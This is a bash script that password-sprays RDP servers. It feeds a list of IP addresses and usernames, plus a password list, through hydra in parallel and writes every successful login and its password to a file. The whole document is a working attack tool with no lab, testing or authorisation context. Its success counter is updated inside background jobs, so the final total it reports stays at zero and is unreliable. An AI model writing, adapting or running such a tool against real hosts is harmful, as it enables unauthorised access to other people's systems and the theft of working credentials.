#!/bin/bash

# Define input and output files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
    exit 1
fi

# Read RDP entries and passwords
mapfile -t iplog_entries < "$iplog_file"
mapfile -t passwords < "$passwords_file"

successful_attempts=0
total_passwords=${#passwords[@]}

# Function to attempt login
attempt_login() {
    local entry="$1"
    local password="$2"

    # Parse the entry for IP and username
    if [[ $entry =~ rdp://([^:]+):(.+) ]]; then
        rdp_ip="${BASH_REMATCH[1]}"
        username="${BASH_REMATCH[2]}"
    else
        echo "Invalid entry format: $entry"
        return
    fi

    # Run hydra and capture the output
    hydra_output=$(hydra -l "$username" -p "$password" "$rdp_ip" rdp -t 4 -W 3 2>&1)

    # Check for specific success indicators in the output
    if echo "$hydra_output" | grep -q "success"; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
        ((successful_attempts++))
    fi
}

# Loop through each password with line number
for index in "${!passwords[@]}"; do
    password="${passwords[index]}"
    current_line=$((index + 1))

    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password (Line $current_line of $total_passwords)"

    for entry in "${iplog_entries[@]}"; do
        # Attempt login
        attempt_login "$entry" "$password" &

        # Limit to 5 concurrent jobs to reduce load
        while (( $(jobs -r -p | wc -l) >= 5 )); do
            wait -n  # Wait for at least one job to finish
        done
    done
done

# Wait for all background jobs to finish
wait

# Final report
echo -e "\n\e[36m----------------------------------------\e[0m"
echo -e "\e[36mTotal Successful Logins: \e[32m$successful_attempts\e[0m"
